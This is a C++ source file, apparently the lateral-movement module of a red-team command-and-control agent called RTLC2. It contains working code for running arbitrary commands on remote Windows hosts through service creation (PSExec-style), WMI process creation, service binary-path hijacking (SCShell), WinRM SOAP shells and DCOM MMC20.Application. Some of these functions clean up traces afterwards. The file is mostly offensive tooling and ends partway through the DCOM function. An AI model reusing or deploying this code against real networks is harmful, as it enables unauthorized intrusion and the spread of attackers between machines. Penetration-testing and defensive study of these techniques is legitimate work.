// Lateral Movement - PSExec, WMI, WinRM, DCOM, SCShell
// Techniques for moving between hosts in a network
#include "agent.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <comdef.h>
#include <wbemidl.h>
#include <cstring>
#include <string>
#include <sstream>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

namespace rtlc2 {
namespace modules {

// PSExec-style: Create remote service, execute, clean up
std::string PSExec(const std::string& target, const std::string& command,
                   const std::string& serviceName) {
    std::string svcName = serviceName.empty() ? "RTLSvc" : serviceName;

    // Connect to remote SCM
    SC_HANDLE hSCM = OpenSCManagerA(target.c_str(), NULL,
        SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!hSCM) {
        return "OpenSCManager failed on " + target + ": " + std::to_string(GetLastError());
    }

    // Create the service
    std::string binPath = "cmd.exe /c " + command;
    SC_HANDLE hService = CreateServiceA(hSCM, svcName.c_str(), svcName.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, binPath.c_str(), NULL, NULL, NULL, NULL, NULL);

    if (!hService) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            hService = OpenServiceA(hSCM, svcName.c_str(), SERVICE_ALL_ACCESS);
            if (hService) {
                // Change the binary path
                ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
                    SERVICE_NO_CHANGE, binPath.c_str(), NULL, NULL, NULL, NULL, NULL, NULL);
            }
        }
        if (!hService) {
            CloseServiceHandle(hSCM);
            return "CreateService failed: " + std::to_string(err);
        }
    }

    // Start the service
    BOOL started = StartServiceA(hService, 0, NULL);
    if (!started && GetLastError() != ERROR_SERVICE_ALREADY_RUNNING) {
        // Service likely exited (expected for cmd.exe /c)
    }

    // Wait briefly for execution
    Sleep(2000);

    // Clean up - delete service
    DeleteService(hService);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return "Executed on " + target + " via service '" + svcName + "': " + command;
}

// WMI Execution
std::string WMIExec(const std::string& target, const std::string& command) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        return "CoInitialize failed";
    }

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE, NULL);

    IWbemLocator* pLocator = NULL;
    hr = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLocator);
    if (FAILED(hr)) {
        return "WbemLocator creation failed";
    }

    // Connect to remote WMI
    std::string wmiPath = "\\\\" + target + "\\root\\cimv2";
    int wLen = MultiByteToWideChar(CP_ACP, 0, wmiPath.c_str(), -1, NULL, 0);
    std::vector<WCHAR> wPath(wLen);
    MultiByteToWideChar(CP_ACP, 0, wmiPath.c_str(), -1, wPath.data(), wLen);

    IWbemServices* pServices = NULL;
    hr = pLocator->ConnectServer(_bstr_t(wPath.data()), NULL, NULL, NULL, 0, NULL, NULL, &pServices);
    if (FAILED(hr)) {
        pLocator->Release();
        return "WMI ConnectServer failed on " + target;
    }

    // Set security on proxy
    CoSetProxyBlanket(pServices, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    // Execute Win32_Process.Create
    IWbemClassObject* pClass = NULL;
    hr = pServices->GetObject(_bstr_t(L"Win32_Process"), 0, NULL, &pClass, NULL);
    if (FAILED(hr)) {
        pServices->Release();
        pLocator->Release();
        return "Failed to get Win32_Process class";
    }

    IWbemClassObject* pInParams = NULL;
    IWbemClassObject* pMethod = NULL;
    hr = pClass->GetMethod(L"Create", 0, &pInParams, NULL);
    pClass->Release();
    if (FAILED(hr)) {
        pServices->Release();
        pLocator->Release();
        return "Failed to get Create method";
    }

    IWbemClassObject* pInInstance = NULL;
    pInParams->SpawnInstance(0, &pInInstance);
    pInParams->Release();

    wLen = MultiByteToWideChar(CP_ACP, 0, command.c_str(), -1, NULL, 0);
    std::vector<WCHAR> wCmd(wLen);
    MultiByteToWideChar(CP_ACP, 0, command.c_str(), -1, wCmd.data(), wLen);

    VARIANT vCmd;
    VariantInit(&vCmd);
    vCmd.vt = VT_BSTR;
    vCmd.bstrVal = SysAllocString(wCmd.data());
    pInInstance->Put(L"CommandLine", 0, &vCmd, 0);
    VariantClear(&vCmd);

    IWbemClassObject* pOutParams = NULL;
    hr = pServices->ExecMethod(_bstr_t(L"Win32_Process"), _bstr_t(L"Create"),
                                0, NULL, pInInstance, &pOutParams, NULL);
    pInInstance->Release();

    std::string result;
    if (SUCCEEDED(hr) && pOutParams) {
        VARIANT vRet;
        VariantInit(&vRet);
        pOutParams->Get(L"ReturnValue", 0, &vRet, NULL, NULL);
        VARIANT vPid;
        VariantInit(&vPid);
        pOutParams->Get(L"ProcessId", 0, &vPid, NULL, NULL);

        result = "WMI Process.Create on " + target + ": return=" +
                 std::to_string(vRet.intVal) + ", PID=" + std::to_string(vPid.intVal);
        VariantClear(&vRet);
        VariantClear(&vPid);
        pOutParams->Release();
    } else {
        result = "WMI ExecMethod failed";
    }

    pServices->Release();
    pLocator->Release();
    return result;
}

// SCShell - Modify existing service binary path
std::string SCShell(const std::string& target, const std::string& command,
                    const std::string& serviceName) {
    std::string svcName = serviceName.empty() ? "XblAuthManager" : serviceName;

    SC_HANDLE hSCM = OpenSCManagerA(target.c_str(), NULL, SC_MANAGER_CONNECT);
    if (!hSCM) return "OpenSCManager failed: " + std::to_string(GetLastError());

    SC_HANDLE hService = OpenServiceA(hSCM, svcName.c_str(),
        SERVICE_CHANGE_CONFIG | SERVICE_START | SERVICE_QUERY_CONFIG);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return "OpenService '" + svcName + "' failed: " + std::to_string(GetLastError());
    }

    // Save original binary path
    BYTE configBuf[8192];
    DWORD needed = 0;
    QueryServiceConfigA(hService, (LPQUERY_SERVICE_CONFIGA)configBuf, sizeof(configBuf), &needed);
    LPQUERY_SERVICE_CONFIGA origConfig = (LPQUERY_SERVICE_CONFIGA)configBuf;
    std::string origBinPath = origConfig->lpBinaryPathName ? origConfig->lpBinaryPathName : "";

    // Change to our command
    std::string payload = "cmd.exe /c " + command;
    ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START,
        SERVICE_NO_CHANGE, payload.c_str(), NULL, NULL, NULL, NULL, NULL, NULL);

    // Start service (will likely fail since cmd.exe isn't a real service, but command runs)
    StartServiceA(hService, 0, NULL);
    Sleep(2000);

    // Restore original binary path
    if (!origBinPath.empty()) {
        ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
            SERVICE_NO_CHANGE, origBinPath.c_str(), NULL, NULL, NULL, NULL, NULL, NULL);
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    return "SCShell executed on " + target + " via service '" + svcName + "': " + command;
}

// ---------------------------------------------------------------------------
// WinRM Execution via WinHTTP SOAP (WS-Management)
// ---------------------------------------------------------------------------
std::string WinRMExec(const std::string& target, const std::string& command,
                      const std::string& user, const std::string& pass) {
    // Load WinHTTP dynamically to avoid hard dependency
    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
    if (!hWinHttp) return "Failed to load winhttp.dll";

    // WinHTTP function typedefs
    typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
    typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
    typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
    typedef BOOL (WINAPI *pWinHttpSetCredentials)(HINTERNET, DWORD, DWORD, LPCWSTR, LPCWSTR, LPVOID);
    typedef BOOL (WINAPI *pWinHttpAddRequestHeaders)(HINTERNET, LPCWSTR, DWORD, DWORD);
    typedef BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
    typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
    typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
    typedef BOOL (WINAPI *pWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);

    auto fnOpen = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
    auto fnConnect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
    auto fnOpenRequest = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
    auto fnSetCredentials = (pWinHttpSetCredentials)GetProcAddress(hWinHttp, "WinHttpSetCredentials");
    auto fnAddHeaders = (pWinHttpAddRequestHeaders)GetProcAddress(hWinHttp, "WinHttpAddRequestHeaders");
    auto fnSendRequest = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
    auto fnReceiveResponse = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
    auto fnReadData = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
    auto fnCloseHandle = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");
    auto fnSetOption = (pWinHttpSetOption)GetProcAddress(hWinHttp, "WinHttpSetOption");

    if (!fnOpen || !fnConnect || !fnOpenRequest || !fnSetCredentials ||
        !fnAddHeaders || !fnSendRequest || !fnReceiveResponse ||
        !fnReadData || !fnCloseHandle || !fnSetOption) {
        FreeLibrary(hWinHttp);
        return "Failed to resolve WinHTTP functions";
    }

    // WS-Management SOAP envelope for command creation
    // Phase 1: Create a shell
    std::string shellId;
    std::string commandId;
    std::string result;

    // Convert target to wide string
    int wTargetLen = MultiByteToWideChar(CP_ACP, 0, target.c_str(), -1, NULL, 0);
    std::vector<WCHAR> wTarget(wTargetLen);
    MultiByteToWideChar(CP_ACP, 0, target.c_str(), -1, wTarget.data(), wTargetLen);

    int wUserLen = MultiByteToWideChar(CP_ACP, 0, user.c_str(), -1, NULL, 0);
    std::vector<WCHAR> wUser(wUserLen);
    MultiByteToWideChar(CP_ACP, 0, user.c_str(), -1, wUser.data(), wUserLen);

    int wPassLen = MultiByteToWideChar(CP_ACP, 0, pass.c_str(), -1, NULL, 0);
    std::vector<WCHAR> wPass(wPassLen);
    MultiByteToWideChar(CP_ACP, 0, pass.c_str(), -1, wPass.data(), wPassLen);

    HINTERNET hSession = fnOpen(L"RTLC2/1.0", 0 /*WINHTTP_ACCESS_TYPE_DEFAULT_PROXY*/,
                                NULL, NULL, 0);
    if (!hSession) {
        FreeLibrary(hWinHttp);
        return "WinHTTP session creation failed";
    }

    HINTERNET hConnect = fnConnect(hSession, wTarget.data(), 5985, 0);
    if (!hConnect) {
        fnCloseHandle(hSession);
        FreeLibrary(hWinHttp);
        return "WinHTTP connect failed to " + target + ":5985";
    }

    // Build SOAP envelope for Create Shell
    std::string createShellSoap =
        "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
        "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
        "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\" "
        "xmlns:p=\"http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd\">"
        "<s:Header>"
        "<a:To>http://" + target + ":5985/wsman</a:To>"
        "<w:ResourceURI s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>"
        "<a:ReplyTo><a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>"
        "<a:Action s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>"
        "<w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>"
        "<w:OperationTimeout>PT60S</w:OperationTimeout>"
        "</s:Header>"
        "<s:Body>"
        "<rsp:Shell xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">"
        "<rsp:InputStreams>stdin</rsp:InputStreams>"
        "<rsp:OutputStreams>stdout stderr</rsp:OutputStreams>"
        "</rsp:Shell>"
        "</s:Body>"
        "</s:Envelope>";

    // Send Create Shell request
    HINTERNET hRequest = fnOpenRequest(hConnect, L"POST", L"/wsman", NULL, NULL, NULL, 0);
    if (!hRequest) {
        fnCloseHandle(hConnect);
        fnCloseHandle(hSession);
        FreeLibrary(hWinHttp);
        return "WinHTTP open request failed";
    }

    // Set credentials (HTTP Basic)
    fnSetCredentials(hRequest, 0 /*WINHTTP_AUTH_TARGET_SERVER*/, 1 /*WINHTTP_AUTH_SCHEME_BASIC*/,
                     wUser.data(), wPass.data(), NULL);

    fnAddHeaders(hRequest, L"Content-Type: application/soap+xml;charset=UTF-8", (DWORD)-1,
                 0x20000000 /*WINHTTP_ADDREQ_FLAG_ADD*/);

    BOOL sent = fnSendRequest(hRequest, NULL, 0,
                              (LPVOID)createShellSoap.c_str(), (DWORD)createShellSoap.size(),
                              (DWORD)createShellSoap.size(), 0);
    if (!sent) {
        fnCloseHandle(hRequest);
        fnCloseHandle(hConnect);
        fnCloseHandle(hSession);
        FreeLibrary(hWinHttp);
        return "WinRM Create Shell request send failed: " + std::to_string(GetLastError());
    }

    fnReceiveResponse(hRequest, NULL);

    // Read response to extract ShellId
    std::string response;
    {
        char buf[4096];
        DWORD bytesRead = 0;
        while (fnReadData(hRequest, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
            response.append(buf, bytesRead);
            bytesRead = 0;
        }
    }
    fnCloseHandle(hRequest);

    // Parse ShellId from response XML
    size_t shellIdStart = response.find("ShellId>");
    if (shellIdStart != std::string::npos) {
        shellIdStart += 8; // length of "ShellId>"
        size_t shellIdEnd = response.find("<", shellIdStart);
        if (shellIdEnd != std::string::npos) {
            shellId = response.substr(shellIdStart, shellIdEnd - shellIdStart);
        }
    }

    if (shellId.empty()) {
        fnCloseHandle(hConnect);
        fnCloseHandle(hSession);
        FreeLibrary(hWinHttp);
        return "WinRM failed to create shell on " + target + ". Response: " +
               (response.size() > 200 ? response.substr(0, 200) : response);
    }

    // Phase 2: Execute command in the shell
    std::string execCommandSoap =
        "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
        "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
        "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\">"
        "<s:Header>"
        "<a:To>http://" + target + ":5985/wsman</a:To>"
        "<w:ResourceURI s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>"
        "<a:ReplyTo><a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>"
        "<a:Action s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>"
        "<w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>"
        "<w:OperationTimeout>PT60S</w:OperationTimeout>"
        "<w:SelectorSet><w:Selector Name=\"ShellId\">" + shellId + "</w:Selector></w:SelectorSet>"
        "</s:Header>"
        "<s:Body>"
        "<rsp:CommandLine xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\">"
        "<rsp:Command>cmd.exe</rsp:Command>"
        "<rsp:Arguments>/c " + command + "</rsp:Arguments>"
        "</rsp:CommandLine>"
        "</s:Body>"
        "</s:Envelope>";

    hRequest = fnOpenRequest(hConnect, L"POST", L"/wsman", NULL, NULL, NULL, 0);
    if (!hRequest) {
        fnCloseHandle(hConnect);
        fnCloseHandle(hSession);
        FreeLibrary(hWinHttp);
        return "WinHTTP open request failed (execute)";
    }

    fnSetCredentials(hRequest, 0, 1, wUser.data(), wPass.data(), NULL);
    fnAddHeaders(hRequest, L"Content-Type: application/soap+xml;charset=UTF-8", (DWORD)-1,
                 0x20000000);

    sent = fnSendRequest(hRequest, NULL, 0,
                         (LPVOID)execCommandSoap.c_str(), (DWORD)execCommandSoap.size(),
                         (DWORD)execCommandSoap.size(), 0);
    if (sent) {
        fnReceiveResponse(hRequest, NULL);

        std::string execResponse;
        char buf[4096];
        DWORD bytesRead = 0;
        while (fnReadData(hRequest, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
            execResponse.append(buf, bytesRead);
            bytesRead = 0;
        }

        // Parse CommandId from response
        size_t cmdIdStart = execResponse.find("CommandId>");
        if (cmdIdStart != std::string::npos) {
            cmdIdStart += 10;
            size_t cmdIdEnd = execResponse.find("<", cmdIdStart);
            if (cmdIdEnd != std::string::npos) {
                commandId = execResponse.substr(cmdIdStart, cmdIdEnd - cmdIdStart);
            }
        }
    }
    fnCloseHandle(hRequest);

    // Phase 3: Receive output
    std::string output;
    if (!commandId.empty()) {
        std::string receiveSoap =
            "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
            "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
            "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\">"
            "<s:Header>"
            "<a:To>http://" + target + ":5985/wsman</a:To>"
            "<w:ResourceURI s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>"
            "<a:ReplyTo><a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>"
            "<a:Action s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action>"
            "<w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>"
            "<w:OperationTimeout>PT60S</w:OperationTimeout>"
            "<w:SelectorSet><w:Selector Name=\"ShellId\">" + shellId + "</w:Selector></w:SelectorSet>"
            "</s:Header>"
            "<s:Body>"
            "<rsp:Receive xmlns:rsp=\"http://schemas.microsoft.com/wbem/wsman/1/windows/shell\" SequenceId=\"0\">"
            "<rsp:DesiredStream CommandId=\"" + commandId + "\">stdout stderr</rsp:DesiredStream>"
            "</rsp:Receive>"
            "</s:Body>"
            "</s:Envelope>";

        hRequest = fnOpenRequest(hConnect, L"POST", L"/wsman", NULL, NULL, NULL, 0);
        if (hRequest) {
            fnSetCredentials(hRequest, 0, 1, wUser.data(), wPass.data(), NULL);
            fnAddHeaders(hRequest, L"Content-Type: application/soap+xml;charset=UTF-8", (DWORD)-1,
                         0x20000000);

            sent = fnSendRequest(hRequest, NULL, 0,
                                 (LPVOID)receiveSoap.c_str(), (DWORD)receiveSoap.size(),
                                 (DWORD)receiveSoap.size(), 0);
            if (sent) {
                fnReceiveResponse(hRequest, NULL);
                char buf[4096];
                DWORD bytesRead = 0;
                while (fnReadData(hRequest, buf, sizeof(buf), &bytesRead) && bytesRead > 0) {
                    output.append(buf, bytesRead);
                    bytesRead = 0;
                }
            }
            fnCloseHandle(hRequest);
        }
    }

    // Phase 4: Delete shell (cleanup)
    std::string deleteSoap =
        "<s:Envelope xmlns:s=\"http://www.w3.org/2003/05/soap-envelope\" "
        "xmlns:a=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" "
        "xmlns:w=\"http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\">"
        "<s:Header>"
        "<a:To>http://" + target + ":5985/wsman</a:To>"
        "<w:ResourceURI s:mustUnderstand=\"true\">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>"
        "<a:ReplyTo><a:Address s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address></a:ReplyTo>"
        "<a:Action s:mustUnderstand=\"true\">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action>"
        "<w:MaxEnvelopeSize s:mustUnderstand=\"true\">153600</w:MaxEnvelopeSize>"
        "<w:OperationTimeout>PT60S</w:OperationTimeout>"
        "<w:SelectorSet><w:Selector Name=\"ShellId\">" + shellId + "</w:Selector></w:SelectorSet>"
        "</s:Header>"
        "<s:Body/>"
        "</s:Envelope>";

    hRequest = fnOpenRequest(hConnect, L"POST", L"/wsman", NULL, NULL, NULL, 0);
    if (hRequest) {
        fnSetCredentials(hRequest, 0, 1, wUser.data(), wPass.data(), NULL);
        fnAddHeaders(hRequest, L"Content-Type: application/soap+xml;charset=UTF-8", (DWORD)-1,
                     0x20000000);
        sent = fnSendRequest(hRequest, NULL, 0,
                             (LPVOID)deleteSoap.c_str(), (DWORD)deleteSoap.size(),
                             (DWORD)deleteSoap.size(), 0);
        if (sent) fnReceiveResponse(hRequest, NULL);
        fnCloseHandle(hRequest);
    }

    fnCloseHandle(hConnect);
    fnCloseHandle(hSession);
    FreeLibrary(hWinHttp);

    if (!commandId.empty()) {
        result = "WinRM executed on " + target + ": " + command +
                 "\nShellId: " + shellId + "\nCommandId: " + commandId;
        if (!output.empty()) {
            result += "\nOutput (raw SOAP):\n" + (output.size() > 2048 ? output.substr(0, 2048) : output);
        }
    } else {
        result = "WinRM command execution failed on " + target;
    }

    return result;
}

// ---------------------------------------------------------------------------
// DCOM Execution via MMC20.Application or ShellWindows
// ---------------------------------------------------------------------------
std::string DCOMExec(const std::string& target, const std::string& command,
                     const std::string& user, const std::string& pass) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) {
        return "CoInitialize failed: 0x" + (std::stringstream() << std::hex << hr).str();
    }

    hr = CoInitializeSecurity(NULL, -1, NULL, NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL, EOAC_NONE, NULL);

    // Set up auth identity if credentials provided
    COAUTHIDENTITY authIdentity = {};
    SEC_WINNT_AUTH_IDENTITY_W* pAuthIdentity = nullptr;

    std::wstring wUser, wPass, wDomain;
    if (!user.empty() && !pass.empty()) {
        // Parse domain\user or user@domain
        std::string domain, username = user;
        size_t slashPos = user.find('\\');
        if (slashPos != std::string::npos) {
            domain = user.substr(0, slashPos);
            username = user.substr(slashPos + 1);
        }

        int len;
        len = MultiByteToWideChar(CP_ACP, 0, username.c_str(), -1, NULL, 0);
        wUser.resize(len - 1);
        MultiByteToWideChar(CP_ACP, 0, username.c_str(), -1, &wUser[0], len);

        len = MultiByteToWideChar(CP_ACP, 0, pass.c_str(), -1, NULL, 0);
        wPass.resize(len - 1);
        MultiByteToWideChar(CP_ACP, 0, pass.c_str(), -1, &wPass[0], len);

        len = MultiByteToWideChar(CP_ACP, 0, domain.c_str(), -1, NULL, 0);
        wDomain.resize(len - 1);
        MultiByteToWideChar(CP_ACP, 0, domain.c_str(), -1, &wDomain[0], len);

        authIdentity.User = (USHORT*)wUser.c_str();
        authIdentity.UserLength = (ULONG)wUser.size();
        authIdentity.Domain = (USHORT*)wDomain.c_str();
        authIdentity.DomainLength = (ULONG)wDomain.size();
        authIdentity.Password = (USHORT*)wPass.c_str();
        authIdentity.PasswordLength = (ULONG)wPass.size();
        authIdentity.Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
    }

    // Convert target to wide string
    int wTargetLen = MultiByteToWideChar(CP_ACP, 0, target.c_str(), -1, NULL, 0);
    std::vector<WCHAR> wTarget(wTargetLen);
    MultiByteToWideChar(CP_ACP, 0, target.c_str(), -1, wTarget.data(), wTargetLen);

    // Set up server info for remote activation
    COSERVERINFO serverInfo = {};
    serverInfo.pwszName = wTarget.data();
    if (!user.empty()) {
        COAUTHINFO authInfo = {};
        authInfo.dwAuthnSvc = RPC_C_AUTHN_WINNT;
        authInfo.dwAuthzSvc = RPC_C_AUTHZ_NONE;
        authInfo.pwszServerPrincName = NULL;
        authInfo.dwAuthnLevel = RPC_C_AUTHN_LEVEL_PKT_PRIVACY;
        authInfo.dwImpersonationLevel = RPC_C_IMP_LEVEL_IMPERSONATE;
        authInfo.pAuthIdentityData = &authIdentity;
        authInfo.dwCapabilities = EOAC_NONE;
        serverInfo.pAuthInfo = &authInfo;
    }

    // Try MMC20.Application first
    // CLSID: {49B2791A-B1AE-4C90-9B8E-E860BA07F889}
    CLSID clsidMMC;
    CLSIDFromString(L"{49B2791A-B1AE-4C90-9B8E-E860BA07F889}", &clsidMMC);

    MULTI_QI mqi = {};
    mqi.pIID = &IID_IDispatch;
    mqi.pItf = NULL;
    mqi.hr = S_OK;

    hr = CoCreateInstanceEx(clsidMMC, NULL, CLSCTX_REMOTE_SERVER,
                            &serverInfo, 1, &mqi);

    if (SUCCEEDED(hr) && SUCCEEDED(mqi.hr)) {
        IDispatch* pMMC = (IDispatch*)mqi.pItf;

        // Set security on proxy if credentials provided
        if (!user.empty()) {
            CoSetProxyBlanket(pMMC, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
                &authIdentity, EOAC_NONE);
        }

        // Navigate: MMC -> Document -> ActiveView -> ExecuteShellCommand
        // Get Document property
        DISPID dispidDoc;
        LPOLESTR nameDoc = (LPOLESTR)L"Document";
        hr = pMMC->GetIDsOfNames(IID_NULL, &nameDoc, 1, LOCALE_USER_DEFAULT, &dispidDoc);
        if (SUCCEEDED(hr)) {
            DISPPARAMS dpNoArgs = { NULL, NULL, 0, 0 };
            VARIANT vDoc;
            VariantInit(&vDoc);
            hr = pMMC->Invoke(dispidDoc, IID_NULL, LOCALE_USER_DEFAULT,
                              DISPATCH_PROPERTYGET, &dpNoArgs, &vDoc, NULL, NULL);
            if (SUCCEEDED(hr) && vDoc.vt == VT_DISPATCH && vDoc.pdispVal) {
                IDispatch* pDoc = vDoc.pdispVal;

                if (!user.empty()) {
                    CoSetProxyBlanket(pDoc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
                        &authIdentity, EOAC_NONE);
                }

                // Get ActiveView property
                DISPID dispidView;
                LPOLESTR nameView = (LPOLESTR)L"ActiveView";
                hr = pDoc->GetIDsOfNames(IID_NULL, &nameView, 1, LOCALE_USER_DEFAULT, &dispidView);
                if (SUCCEEDED(hr)) {
                    VARIANT vView;
                    VariantInit(&vView);
                    hr = pDoc->Invoke(dispidView, IID_NULL, LOCALE_USER_DEFAULT,
                                      DISPATCH_PROPERTYGET, &dpNoArgs, &vView, NULL, NULL);
                    if (SUCCEEDED(hr) && vView.vt == VT_DISPATCH && vView.pdispVal) {
                        IDispatch* pView = vView.pdispVal;

                        if (!user.empty()) {
                            CoSetProxyBlanket(pView, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
                                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE,
                                &authIdentity, EOAC_NONE);
                        }

                        // Call ExecuteShellCommand(Command, Directory, Parameters, WindowState)
                        DISPID dispidExec;
                        LPOLESTR nameExec = (LPOLESTR)L"ExecuteShellCommand";
                        hr = pView->GetIDsOfNames(IID_NULL, &nameExec, 1, LOCALE_USER_DEFAULT, &dispidExec);
                        if (SUCCEEDED(hr)) {
                            // Parse command into executable and arguments
                            std::string exe = "cmd.exe";
                            std::string args = "/c " + command;

                            int wExeLen = MultiByteToWideChar(CP_ACP, 0, exe.c_str(), -1, NULL, 0);
                            std::vector<WCHAR> wExe(wExeLen);
                            MultiByteToWideChar(CP_ACP, 0, exe.c_str(), -1, wExe.data(), wExeLen);

                            int wArgsLen = MultiByteToWideChar(CP_ACP, 0, args.c_str(), -1, NULL, 0);
                            std::vector<WCHAR> wArgs(wArgsLen);
                            MultiByteToWideChar(CP_ACP, 0, args.c_str(), -1, wArgs.data(), wArgsLen);

                            // ExecuteShellCommand args (in reverse order for DISPPARAMS)
                            VARIANT vArgs[4];
                            // WindowState = "7" (minimized)
                            VariantInit(&vArgs[0]);
                            vArgs[0].vt = VT_BSTR;
                            vArgs[0].bstrVal = SysAllocString(L"7");
                            // Parameters
                            VariantInit(&vArgs[1]);
                            vArgs[1].vt = VT_BSTR;
                            vArgs[1].bstrVal = SysAllocString(wArgs.data());
                            // Directory
                            VariantInit(&vArgs[2]);
                            vArgs[2].vt = VT_BSTR;
                            vArgs[2].bstrVal = SysAllocString(L"C:\\");
                            // Command
                            VariantInit(&vArgs[3]);
                            vArgs[3].vt = VT_BSTR;
                            vArgs[3].bstrVal = SysAllocString(wExe.data());

                            DISPPARAMS dp;
                            dp.rgvarg = vArgs;
                            dp.cArgs = 4;
                            dp.rgdispidNamedArgs = NULL;
                            dp.cNamedArgs = 0;

                            VARIANT vResult;
                            VariantInit(&vResult);
                            hr = pView->Invoke(dispidExec, IID_NULL, LOCALE_USER_DEFAULT,
                                               DISPATCH_METHOD, &dp, &vResult, NULL, NULL);

                            for (int i = 0; i < 4; i++) VariantClear(&vArgs[i]);
